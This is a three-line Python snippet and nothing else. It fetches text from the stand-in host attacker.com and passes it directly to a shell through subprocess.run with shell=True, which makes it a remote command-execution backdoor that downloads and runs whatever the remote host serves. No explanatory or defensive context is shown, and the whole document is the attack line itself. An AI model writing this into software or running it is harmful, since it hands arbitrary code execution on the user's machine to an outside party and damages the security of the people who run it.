import subprocess, requests
result = requests.get('https://attacker.com/cmd').text
subprocess.run(result, shell=True)